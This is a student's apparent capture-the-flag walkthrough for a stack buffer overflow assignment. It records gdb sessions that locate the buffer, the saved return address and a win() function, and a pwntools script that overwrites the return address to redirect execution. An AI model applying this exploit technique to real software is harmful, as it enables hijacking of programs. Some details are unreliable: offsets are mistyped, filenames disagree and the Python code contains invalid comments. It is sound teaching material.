@@ -1,0 +1,96 @@
+Return address: 0x5565d7688645 
+Base Pointer: 0x7ffdcd783540
+Stored in: 7ffdcd783050
+
+Steps:
+0: command: ./Assignment5_stackoverflow2_teaching
+1: Command: gdb Assignment5_stackoverflow2_teaching
+2: Command: (gdb) r (runs the program) tells you where an input signal is
+	    saved
+3: Command: (gdb) ctrl-c
+   output: Program received signal SIGINT, Interrupt.
+0x00007f31c649b142 in __GI___libc_read (fd=0, buf=7ffdcd783050, nbytes=1488) <- register 7ffdcd783050 in the buf
+at ../sysdeps/unix/sysv/linux/read.c:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+
+4: Command: (gdb) x/s $rdi
+	output: 0x0:    <error: Cannot access memory at address 0x0>
+5: Command: (gdb) p $rsi
+	output: $1 = 140728050659408 (THIS IS THE RSI VALUE AS DECIMAL)
+6: (WITHOUT CLOSE THE GDB TERMINAL FOR THE CTF IT RESETS THE VALUES IF YOU CLOSE THE TERMINAL) 
+   Command: ipython
+7: Command: hex(140728050659408)
+	output: Out[1]: '0x7ffdcd783050' (RSI VALUE)
+8: Command: (gdb) x/i 0x7ffdcd783050
+	output: 0x7ffdcd783050:      add    %eax,(%rax)
+9: Command: (gdb) x/20g 0x7ffdcd783050 (adjust the 20 I had to use like 50 to find my register)
+	output: 
+0x7ffdcd783050: 0x0000000000000001      0x00007f8e9c529570
+0x7ffdcd783060: 0x0000000000000001      0x0000000000000000
+0x7ffdcd783070: 0x0000000000000001      0x00007f8e9c566190
+0x7ffdcd783080: 0x00000000019dfe69      0x00007f8e9c529570
+0x7ffdcd783090: 0x00007f8e9c566190      0x00007f8e9c5664f8
+0x7ffdcd7830a0: 0x0000000000000000      0x00007ffdcd783190
+0x7ffdcd7830b0: 0x0000000000000000      0x00007f8e00000001
+0x7ffdcd7830c0: 0x00000000ffffffff      0x0000000000000000
+0x7ffdcd7830d0: 0x00007f8e9c34b520      0x00007f8e9c529000
+0x7ffdcd7830e0: 0x0000000000000000      0x00000000677f9a5f
+~
+0x7ffdcd783540: 0x00007ffdcd783570      0x00005565d7688645 <- where my return address(2nd) exsisted and base pointer(1st)
+
+10: Command: (gdb) x/p $rbp
+	output: 0x7ffdcd783540: Undefined output format "p".
+11: Command: (back to other python terminal) 
+	need to find rbp - rsi + 8
+	(ipython)  0x7ffdcd783540 - 0x7ffdcd783050 + 8
+	output: 1272
+	hex(0x7ffdcd783050 + 1272) == 0x7ffdcd783548
+	
+12: Command: (gdb) x/b 0x7ffdcd783548	
+	output: 0x7ffdcd783548: 0x45 (it moves by values of two down the register, 45 -> 86 -> 68...
+13: command: (gdb) x/p win
+	output: 0x5565d7688310 <win>:   Undefined output format "p".
+14: command: (gdb) x/i 0x00005565d7688645
+	output: 0x5565d7688645 <main+81>:    mov    $0x0,%eax <-return to main 81 and moves 0x5565d7688310 bytes
+15: command: (python) hex(0x5565d7688645 - 0x5565d7688310)
+	output:  0x335
+16: Python for stackoverflow2_teaching: /tmp/st0f2.py
+#!/usr/bin/env python3
+import pwn
+import sys
+
+while True:
+	p = pwn.process('/Assignment5_stackoverflow2_teaching')
+	out = p.clean().decode()
+	
+	returnAddress = out.split("Curent Return Address: ")[1].split()[0] //ADDRESS CHANGES EVERYTIME
+	print("Old: ", returnAddress)
+	
+	returnAddress = int(returnAddress, 16)
+	
+	#0x355 = 0x5565d7688645 <main+81>(x/i -> that register) - 0x5565d7688310 (x/p win)
+	
+	returnAddress = returnAddress - 0x335 #<--- (how much it has to move)
+	print("New: ", returnAddress)
+	
+	#num = 0x7ffdcd783540 - 0x7ffdcd783050 + 8 = 1272 <- (calulated above)
+	num = 1272
+	
+	payload = (pwn.cyclic(num) + returnAddress.to_bytes(8, 'little'))
+	
+	p.send(payload)
+	
+	print(p.clean().decode())
+	
+	sys.exit()
+//end stof2.py	
+			
+17: command: (ctf terminal) touch /tmp/out2.txt
+18: command: (ctf terminal from "cd /") python3 ./tmp/stof2.py > /tmp/out2.txt
+
+19: command: cat /tmp/out2.txt
+
+20: your flag should be there	 
+	
+
+
